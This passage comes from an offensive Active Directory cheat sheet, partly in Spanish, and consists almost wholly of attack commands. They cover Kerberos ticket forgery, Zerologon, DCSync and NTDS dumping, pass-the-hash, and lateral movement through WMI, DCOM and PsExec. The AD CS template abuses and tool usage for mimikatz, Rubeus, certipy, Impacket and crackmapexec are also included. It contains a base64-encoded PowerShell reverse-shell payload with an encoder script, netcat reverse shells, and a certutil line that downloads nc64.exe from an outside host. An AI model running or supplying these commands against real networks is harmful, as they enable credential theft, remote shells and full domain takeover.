mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:<DOMAIN> /ptt /target:<RHOST> /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:<USERNAME>
klist
iwr -UseDefaultCredentials http://<RHOST>
```

With Rubeus, first get the ticket.kirbi

```c
.\Rubeus.exe silver /service:cifs/<COMPUTERNAME>.<DOMAIN> /aes256:<AESHASH> /user:<USERNAME> /domain:<DOMAIN> /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
```

```c
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<BASE64_TICKET>
```

###### Domain Controller Attack Steps

No creds

```c
impacket-secretsdump -just-dc -no-pass DC_NAME\$@IP
```

Test for Zerologon
https://github.com/SecuraBV/CVE-2020-1472

```c
python3 zerologon_tester.py DC_NAME IP
```

Exploit with CVE-2020-1472

```c
python3 cve-2020-1472-exploit.py DC_NAME IP // change account passwords to empty
impacket-secretsdump -just-dc -no-pass DC_NAME\$@IP // dump hashes
```


###### Domain Controller Syncronization (DCSync)

###### Prerequisites

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered

###### Domain Controller Synchonization Execution

```c
PS C:\> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:<DOMAIN>\<USERNAME>
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator
hashcat -m 1000 <FILE> /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```c
impacket-secretsdump -just-dc-user <USERNAME> <DOMAIN>/<USERNAME>:"<PASSWORD>"@<RHOST>
```

##### Lateral Movement

###### Windows Management Instrumentation (WMI)

###### Spawning Process

```c
wmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"
```

###### Store Credentials

```c
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

###### Instanciate Distributed Component Object MOdel (DCOM)

```c
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <RHOST> -Credential $credential -SessionOption $Options 
$command = 'cmd';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

###### Creating Payload

###### revshell_encoder.py

powershell revshell one-liner

```c
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

In the commandline

```c
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)

Usage:
curl http://IP/backdoor.pHP?cmd=powershell%20-enc%20<$EncodedText>
```

###### Payload Encoding

```c
python3 encode.py
```

```c
powershell -nop -w hidden -e JAB<--- SNIP --->CkA
```

###### Execution

```c
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <RHOST> -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e JAB<--- SNIP --->CkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

###### Windows Remote Shell (WinRS)

###### Prerequisites

- User needs to be part of the Administrators or Remote Management Users group on the target host

###### Execution

```c
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e JAB<--- SNIP --->CkA"
```

###### PowerShell

```c
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <RHOST> -Credential $credential
Enter-PSSession 1
```

###### PsExec

```c
.\PsExec64.exe -i \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```

###### Pass the Hash (PtH)

```c
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
```

###### Overpass the Hash

```c
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
klist
dir \\<RHOST>\<SHARE>
klist
.\PsExec.exe \\<RHOST> cmd
```

###### Pass the Ticket

###### Prerequisites

- Export an already existing ticket of a user

###### Exporting the Ticket

```c
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz #sekurlsa::tickets /export
dir *.kirbi
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-<USERNAME>@cifs-<RHOST>.kirbi
klist
.\PsExec.exe \\<RHOST> cmd
```

###### Distributed Component Object Model (DCOM)

###### Prerequisites

- Elevated PowerShell session

###### Creating and storing the Distributed Component Object Model

```c
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<RHOST>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c cmd","7")
tasklist | findstr "cmd"
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB<--- SNIP --->CkA","7")
```

##### Active Directory Persistence

###### Golden Tickets

###### Prerequisites

- Hash of krbtgt

###### Forge and Inject Golden Ticket

```c
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
mimikatz # misc::cmd
```

GET the TICKET 

```c
dcsync <DOMAIN> DEV\krbtgt
.\Rubeus.exe golden /aes256:<AESHASH> /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /nowrap
```

Get a session

```c
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<TICKET>
```

###### Execution

Use the `hostname` and not the `IP address` because otherwise it would authenticate via `NTLM` and the access would still be blocked.

```c
.\PsExec.exe \\<RHOST> cmd
```

###### Diamond Tickets

Get the ticket

```c
\Rubeus.exe diamond /tgtdeleg /ticketuser:<USERNAME> /ticketuserid:<RID_of_USER> /groups:512 /krbkey:<krbtgt AES256 hash> /nowrap
```

```c
.\Rubeus.exe describe /ticket:<TICKET>
```

###### Volume Shadow Service (VSS) aka Shadow Copies

> https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/

###### Create and collect necessary Files

```c
vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
reg.exe save hklm\system C:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

#### Active Directory Certificate Services (AD CS)

```c
certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
.\Certify.exe cas
.\Certify.exe find /vulnerable
```

##### ESC1: Misconfigured Certificate Templates

```c
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

###### Windows

```c
.\Certify.exe request /ca:<CA> /template:<TEMPLATE> /altname:<administrator>
```

Copy the rsa keys and save it to cert.pem

```c
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
cat cert.pfx | base64 -w 0
.\Rubeus.exe asktgt /user:nlamb /certificate:<Base64Cert> /password:pass123 /nowrap
```

##### ESC2: Misconfigured Certificate Templates

```c
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC3: Enrollment Agent Templates

```c
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC4: Vulnerable Certificate Template Access Control

```c
certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

```c
certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip <RHOST> -stdout
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
certipy req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC7: Vulnerable Certificate Authority Access Control

```c
certipy ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
certipy ca -ca '<CA>' -enable-template SubCA -username <USERNAME>@<DOMAIN> -password <PASSWORD>
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template SubCA -upn administrator@<DOMAIN>
certipy ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -retrieve <ID>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC8: NTLM Relay to AD CS HTTP Endpoints

```c
certipy relay -target 'http://<CA>'
certipy relay -ca '<CA>' -template <TEMPLATE>
python3 PetitPotam.py <RHOST> <DOMAIN>
certipy auth -pfx dc.pfx -dc-ip <RHOST>
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

###### Coercing

```c
impacket-ntlmrelayx -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
python3 PetitPotam.py <RHOST> <DOMAIN>
python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'dc$' 'dc.ccache'
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

##### ESC9: No Security Extensions

```c
certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
certipy req -ca '<CA>' -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -template <TEMPLATE>
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

##### ESC10: Weak Certificate Mappings

###### Case 1

```c
certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -hashes a87f3a337d73085c45f9416be5787d86
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

###### Case 2

```c
certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn 'DC$@<DOMAIN>'
certipy req -ca 'CA' -username <USERNAME>@<DOMAIN> -password -hashes a87f3a337d73085c45f9416be5787d86
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
certipy auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
```

##### ESC11: IF_ENFORCEENCRYPTICERTREQUEST

```c
certipy relay -target 'rpc://<CA>' -ca 'CA'
certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

#### ADCSTemplate

```c
Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
```

#### ADMiner

```c
AD-miner -u <USERNAME> -p <PASSWORD> -cf <NAME>
```

#### BloodHound

https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/ 

```c
sudo apt-get install openjdk-11-jdk
pip install bloodhound
sudo apt-get install neo4j
sudo apt-get install bloodhound
```

##### Installing and starting Database

```c
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install apt-transport-https
sudo apt-get install neo4j
systemctl start neo4j
./bloodhound --no-sandbox
```

>  http://localhost:7474/browser/

###### Docker Container

```c
docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/<PASSWORD> -v $(pwd)/neo4j:/data neo4j:4.4-community
```

##### Database Password Reset

>  http://localhost:7474/browser/

```c
ALTER USER neo4j SET PASSWORD '<PASSWORD>'
```

#### BloodHound Python

```c
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns <RHOST> -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
```

On victims machine

```c
Import-Module ./SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\USER\Desktop\ -OutputPrefix "corp audit"

SharpHound.exe -c All --ldapusername <USERNAME> --ldappassword <PASSWD>
```

#### bloodyAD

> https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

```c
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user                       // Get all users of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer                   // Get all computers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type container                  // Get all containers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump                                                              // Get AD DNS records
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member                                           // Get group members
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version        // Get AD functional level
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength                 // Get minimum password length policy
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl                        // Get UserAccountControl flags
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<OBJECT>$' --attr ms-Mcs-AdmPwd                              // Read LAPS password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<OBJECT>$' --attr msDS-ManagedPassword                       // Read GMSA account password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST>        // Set a password for a user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                           // Add a new DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH                                      // Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>                                        // Remove a DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac <USERNAME> ACCOUNTDISABLE                                     // Disable ACCOUNTDISABLE
```

#### Certify

> https://github.com/GhostPack/Certify

```c
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

#### Certipy

> https://github.com/ly4k/Certipy

> https://github.com/ly4k/BloodHound/

```c
certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
certipy find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
```

##### Account Creation

```c
certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <RHOST> -user <COMPUTERNAME>
```

##### Authentication

```c
certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
```

###### LDAP-Shell

```c
certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
```

```c
# add_user <USERNAME>
# add_user_to_group <GROUP>
```

##### Certificate Forging

```c
certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
```

##### Certificate Request

Run the following command twice because of a current issue with `certipy`.

```c
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
```

```c
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN> -debug
```

##### Revert Changes

```c
certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLATE> -dc-ip <RHOST> -configuration <TEMPLATE>.json
```

##### Start BloodHound Fork

```c
./BloodHound --disable-gpu-sandbox
```

#### enum4linux-ng

```c
enum4linux-ng -A <RHOST>
```

```c
pyhton3 nullnix IP
```

#### Evil-WinRM

```c
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
evil-winrm -i <RHOST> -u <USERNAME> -H <HASH>
```

Port 5986

Para el puerto 5986

```c
evil-winrm -i IP -u USERNAME -p '<PASSWORD>' -S
```


#### Net

Listar shares en el DC

```c
net view \\DCNAME /all  in winows
```

#### Crackmapexec

```c
crackmapexec smb IP
```

```c
crackmapexec smb IP -u 'user' -p 'passw' 
```

Dump admin hashes

```c
crackmapexec smb IP -u 'user' -p 'passw'  --sam
```

List ntlm hashes at directory level

```c
crackmapexec smb IP -u 'user' -p 'passw' --ntds vss 
```

```c
crackmapexec smb IP -u 'user' -H 'HASH_NTLM'
```

Execute commands

```c
 crackmapexec smb IP -u wsadmin -H '669b12a3bac275251170afbe2c5de8c2' -x 'certutil -urlcache -f http://10.10.14.6/nc64.exe nc.exe'
 crackmapexec smb IP -u USER -p 'PSS' --exec-method smbexec -x "whoami"
```

If its pwned then use psexec.py

```c
python psexec.py USER@IP
impacket-psexec administrator@IP
psexec USER@IP -hashes :HASH_NT
impacket-psexec -hashes 00000000000000000000000000000000:HASH USER@IP
impacket-psexec -hashes :HASH USER@IP
psexec WORKGROUP/USER@PIP cmd.exe
impacket-psexec WORKGROUP\username@IP cmd.exe
psexec.py 'DOMAIN/USER:PASS'@IP
```

pipenv shell
crackmapexec smb IP --shares

Brute force password

```c
cme smb IP -u 'user' -p password.txt 
```

With credentials check all the network machines the user can log in

```c
cme smb IP.0/24 -u 'user' -p 'passw'
```

Continue running even after a success

```c
--continue-on-success 
```

With credentials run lookupsid.py in /usr/share/doc/python3-impacket/examples
tu find more users 

```c
python3 lookupsod.py 'USER:PASSWD'@IP
```
If STATUS_PASSWORD_MUST_CHANGE

```c
smbpasswd -r 10.10.10.X -U "bhult"
```

old password and then new password 

### Mount

```c
mount -t cifs"//IP/Folders" /mnt/smbmounted
```

Not real samba privileges, it is manage by the acl (access control list)

```c
mount -t cifs //IP/DIRECTORY /mnt/smbmounted -o username=USERNAME,password=PASSWORD,domain=DOMAIN_NAME,rw
mount -t cifs -o username=<win_share_user> //WIN_SHARE_IP/<share_name> /mnt/win_share
```

```c
sudo mount -t cifs -o username=Finance,password=Acc0unting //htb.local/ACCT /mnt/smb
```

If there is a port 111 then rpcinfo: nfs use 

```c
showmount -e IP
```

```c
mount -t nfs IP:/FOLDER /mnt/nfs
```

#### Impacket

##### impacket-atexec

```c
impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
```

##### impacket-dcomexec

```c
impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug '<DOMAIN>/<USERNAME>':'<PASSWORD>' '<COMMAND>'
impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand '<DOMAIN>/<USERNAME>@<RHOST>' '<COMMAND>'
```

##### impacket-findDelegation

```c
impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>
```

##### impacket-GetADUsers

```c
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
```

##### impacket-GetNPUsers

```c
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
```

##### impacket-getST

```c
impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
impacket-getST <DOMAIN>/<USERNAME>$ -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
```

##### impacket-getTGT

```c
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

##### impacket-getUserSPNs

```c
impacket-GetUserSPNs <DOMAIN>/<USERNAME> -dc-ip <RHOST> -request
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request
```

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
```

##### impacket-lookupsid

```c
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-netview

```c
impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
```

##### impacket-ntlmrelayx

###### Common Commands

```c
impacket-ntlmrelayx -t <LHOST> --no-http-server -smb2support -c "powershell -enc JAB<--- SNIP --->j=="
impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
```

###### Example

```c
impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA<--- CUT FOR BREVITY --->"
```

```c
dir \\<LHOST>\foobar
```

```c
nc -lnvp <LPORT>
```

##### impacket-psexec

```c
impacket-psexec <USERNAME>@<RHOST>
impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

##### impacket-req

```c
impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
```

##### impacket-rpcdump

```c
impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-samrdump

```c
impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-secretsdump

```c
impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
```

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
```

##### impacket-services

```c
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
```

##### impacket-smbclient

```c
impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
```

##### impacket-smbpasswd

```c
impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
```

##### impacket-smbserver

Create a smb server

```c
impacket-smbserver local . -smb2support
impacket-smbserver smbFolder $(pwd) -smb2support
impacket-smbserver smbFolder $(pwd) -smb2support -username henrial -password henrial
```
Client side

```c
 net use \\IP\smbFolder /u:henrial hernial123
 copy  \\IP\smbFolder\FILE C:\RUTA\FILE
```

with password

```c
$pass = ConvertTo-SecureString 'HACKER123!!!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('hacker', $pass)
New-PSDrive -Name smbFolder -PSProvider FileSystem -Credential $cred -Root \\192.168.45.161\smbFolder
cp FILE \\192.168.45.161\smbFolder
```

Powershell on the victims machine

```c
• $pass = ConvertTo-SecureString 'HENRIAL_PASS' -AsPlainText -Force
• $cred = New-Object System.Management.Automation.PSCredential('vk9guest', $pass)
• New-PSDrive -Name henrialsmb -PSProvider FileSystem -Credential $cred -Root \\10.10.14.X\smbFolder
```

In windows

```c
start /b \\IP\smbFolder\dir -e cmd IPDestino nc.exe 444
\\IP\smbFolder\nc.exe -e cmd IP PORT
```

##### impacket-ticketer

###### Requirements

* Valid User
* NTHASH
* Domain-SID

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
```

###### Fixing [-] exceptions must derive from BaseException

###### Issue

```c
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

